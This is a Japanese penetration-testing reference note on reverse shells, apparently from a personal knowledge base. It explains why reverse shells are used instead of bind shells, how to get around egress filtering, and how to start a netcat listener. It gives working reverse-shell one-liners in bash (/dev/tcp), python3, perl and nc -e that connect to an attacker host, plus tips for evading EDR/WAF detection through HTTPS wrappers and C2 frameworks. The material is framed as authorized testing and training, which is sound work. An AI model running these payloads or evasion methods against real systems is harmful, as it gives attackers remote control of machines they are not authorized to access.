## リバースシェルとは

**「標的から攻撃者に接続させる」仕組み。**

通常の操作では攻撃者からターゲットに接続しに行く（バインドシェル）が、リバースシェルでは逆にターゲット側から攻撃者側に接続させる。攻撃者はあらかじめ自分のマシンでリスナーを起動して待ち受ける。

```
[Attacker（テスター端末）]      [Target（標的）]
  リスナー起動         ←接続←   ペイロード実行
  待ち受け状態                  シェルを攻撃者に向けて送出
```

---

## なぜバインドシェルではなくリバースシェルを使うのか

**ファイアウォールを越えるため。**

多くの本番環境では、外部からターゲットへの新規インバウンド接続はファイアウォールでブロックされている。しかしターゲットから外部へのアウトバウンド通信（HTTPやHTTPSに見せかけるなど）は許可されていることが多い。

リバースシェルはターゲットが「外に出る」接続なので、このファイアウォールの非対称性を利用できる。

| 手法 | 接続方向 | ファイアウォールの壁 |
|------|---------|-----------------|
| バインドシェル | 攻撃者 → ターゲット | インバウンドポートがブロックされると使えない |
| リバースシェル | ターゲット → 攻撃者 | アウトバウンドが許可されていれば越えられる |

---

## 本番でのアウトバウンド制限への配慮

**本番では egress filtering（FW・Proxy で 443/HTTPS 以外を遮断）が標準。**
リバースシェルが直接通らない場合の代替手段を事前に用意しておく：

| アウトバウンド条件 | 試す手 |
|------------------|--------|
| HTTPSのみ許可（443/tcp） | PowerShell/Python による HTTPS リバースシェル（`Invoke-WebRequest` 経由・C2 フレームワークの HTTPS リスナー） |
| 特定プロキシ経由のみ許可 | プロキシ対応のペイロード（`HTTP_PROXY` 環境変数 / `--proxy` オプション付き C2） |
| アウトバウンド完全遮断 | バインドシェル + ジャンプサーバー経由 / インバウンドオンリー診断 |
| DNS のみ通る | DNS over HTTPS / iodine 等の DNS トンネリング |

**生TCP の `nc` リバースシェルは本番環境のWAF/EDRで即検知される。**
本番案件で使う場合は事前合意とリスニング側の隠蔽（HTTPSラッパー・C2フレームワーク経由）を前提にする。

> 演習環境（HTB / OSCP 等）ではここまでの配慮は不要。生 nc + 4444/tcp で動くことが多い。

### 試す前の到達性確認（必須）

リバースシェルを実行する前に、外向き到達性をターゲット側から確認しておく：

```bash
# [Attacker] テスター端末側でリスナー起動
nc -lvnp 443

# [Target] ターゲット側から外向きHTTP/HTTPSの到達性を確認
curl -v http://[ATTACKER_IP]:443
# → 接続できなければアウトバウンドが該当ポートで遮断されている
# → 別ポート（80/443/53）を試す or プロキシ経由を試す
```

## 攻撃側の準備

### ① 自分のIPアドレスを確認する（テスター端末側）

```bash
ip a
# 全インターフェースを表示
# テスト経路（物理LAN・VPN・専用線・ジャンプサーバー）に対応するインターフェースのIPを使う
```

**どのインターフェースのIPを使うか：**

- 物理LANで対象セグメントに接続している場合 → 当該物理NICのIP
- VPN（クライアントVPN・拠点VPN等）経由でリーチする場合 → VPNインターフェースのIP
- ジャンプサーバー経由の場合 → ジャンプサーバー側からターゲットに見えるIP（自端末ではなくジャンプサーバー上でリスナーを起動するか、ポートフォワード）

> 「`tun0` を使えばよい」「`eth0` を使えばよい」と決め打ちしない。
> 環境ごとに到達経路が違うため、`ip a` で全インターフェースを見て、ターゲットからルーティング可能なIPを選ぶ。

### ② リスナーを起動する（テスター端末側）

```bash
nc -lvnp 4444
# -l : リスニングモード
# -v : 詳細出力
# -n : DNS名前解決しない
# -p : ポート番号指定
```

ポートは任意だが、本番案件では `443/tcp` `80/tcp` を選ぶ（egress フィルタを通りやすい）。
演習環境では 4444・1337・9001・8080 などがよく使われる。
ターゲットからの接続が来ると、そのままシェルとして操作できる。

## ターゲット側のペイロード例

以下は `LHOST=[ATTACKER_IP]` `LPORT=4444` の場合の例。実際の値に置き換えること。

### bash

```bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
# またはURLエンコード対応形式（コマンドインジェクション経由で送る場合）
bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
```

### python3

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### perl

```bash
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### nc（ターゲットにncがある場合）

```bash
nc LHOST LPORT -e /bin/bash
# 注意：-e オプションは古いバージョンのncにしかない。
# ncat（Nmap同梱）なら -e が使える。
```

## 注意点・落とし穴

- **自分のIPを決め打ちしない**
  「VPN前提なら `tun0`」「物理LANなら `eth0`」のような決め打ちはしない。
  `ip a` で全インターフェースを確認し、ターゲットからルーティング可能なIPを選ぶ。

- **ポートが被っていないか確認する**
  `ss -tlnp | grep 4444` でポートが空いていることを確認してからリスナーを起動する。

- **シェルが安定していない場合はシェル安定化を行う**
  リバースシェル直後は入力制御が不完全（Ctrl+Cで切れる・TAB補完なし等）。
  > 安定化手順 → `../03_Post_Access_Linux/Shell_Stabilization.md`

- **検知への配慮（本番）**
  生TCP のリバースシェルは EDR/WAF で `bash -i`・`/dev/tcp/` のパターンで検知される。
  C2 フレームワーク（ペイロード難読化対応）の利用や、HTTPS にラップするなどの工夫が必要。
  事前合意で「シェル取得手法の自由度」をRoEで明示的に確認すること。
